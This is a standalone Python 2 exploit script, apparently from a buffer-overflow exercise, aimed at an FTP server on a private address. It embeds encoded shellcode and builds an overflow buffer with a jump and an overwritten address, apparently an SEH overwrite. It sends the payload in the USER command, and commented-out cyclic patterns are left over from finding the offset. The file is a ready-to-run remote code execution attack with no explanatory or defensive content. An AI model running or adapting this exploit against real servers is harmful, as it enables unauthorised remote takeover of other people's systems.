#!/usr/bin/python

import socket

shellcode = ("\xdb\xd7\xb8\xa2\x98\xb1\xe7\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"+
"\x53\x31\x43\x17\x83\xeb\xfc\x03\xe1\x8b\x53\x12\x19\x43\x11"+
"\xdd\xe1\x94\x76\x57\x04\xa5\xb6\x03\x4d\x96\x06\x47\x03\x1b"+
"\xec\x05\xb7\xa8\x80\x81\xb8\x19\x2e\xf4\xf7\x9a\x03\xc4\x96"+
"\x18\x5e\x19\x78\x20\x91\x6c\x79\x65\xcc\x9d\x2b\x3e\x9a\x30"+
"\xdb\x4b\xd6\x88\x50\x07\xf6\x88\x85\xd0\xf9\xb9\x18\x6a\xa0"+
"\x19\x9b\xbf\xd8\x13\x83\xdc\xe5\xea\x38\x16\x91\xec\xe8\x66"+
"\x5a\x42\xd5\x46\xa9\x9a\x12\x60\x52\xe9\x6a\x92\xef\xea\xa9"+
"\xe8\x2b\x7e\x29\x4a\xbf\xd8\x95\x6a\x6c\xbe\x5e\x60\xd9\xb4"+
"\x38\x65\xdc\x19\x33\x91\x55\x9c\x93\x13\x2d\xbb\x37\x7f\xf5"+
"\xa2\x6e\x25\x58\xda\x70\x86\x05\x7e\xfb\x2b\x51\xf3\xa6\x23"+
"\x96\x3e\x58\xb4\xb0\x49\x2b\x86\x1f\xe2\xa3\xaa\xe8\x2c\x34"+
"\xcc\xc2\x89\xaa\x33\xed\xe9\xe3\xf7\xb9\xb9\x9b\xde\xc1\x51"+
"\x5b\xde\x17\xcf\x53\x79\xc8\xf2\x9e\x39\xb8\xb2\x30\xd2\xd2"+
"\x3c\x6f\xc2\xdc\x96\x18\x6b\x21\x19\x37\x30\xac\xff\x5d\xd8"+
"\xf8\xa8\xc9\x1a\xdf\x60\x6e\x64\x35\xd9\x18\x2d\x5f\xde\x27"+
"\xae\x75\x48\xbf\x25\x9a\x4c\xde\x39\xb7\xe4\xb7\xae\x4d\x65"+
"\xfa\x4f\x51\xac\x6c\xf3\xc0\x2b\x6c\x7a\xf9\xe3\x3b\x2b\xcf"+
"\xfd\xa9\xc1\x76\x54\xcf\x1b\xee\x9f\x4b\xc0\xd3\x1e\x52\x85"+
"\x68\x05\x44\x53\x70\x01\x30\x0b\x27\xdf\xee\xed\x91\x91\x58"+
"\xa4\x4e\x78\x0c\x31\xbd\xbb\x4a\x3e\xe8\x4d\xb2\x8f\x45\x08"+
"\xcd\x20\x02\x9c\xb6\x5c\xb2\x63\x6d\xe5\xc2\x29\x2f\x4c\x4b"+
"\xf4\xba\xcc\x16\x07\x11\x12\x2f\x84\x93\xeb\xd4\x94\xd6\xee"+
"\x91\x12\x0b\x83\x8a\xf6\x2b\x30\xaa\xd2")

buffer = "A" * 569 + "B" * 2 + "\x06\xEB" + "\xCA\x80\x45\x5F" + shellcode + "B" * 318

#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B"
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect = s.connect(('10.0.10.1', 21))
response = s.recv(1024)
print response

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response

s.send('PASS PASSWORD\r\n')
s.close()

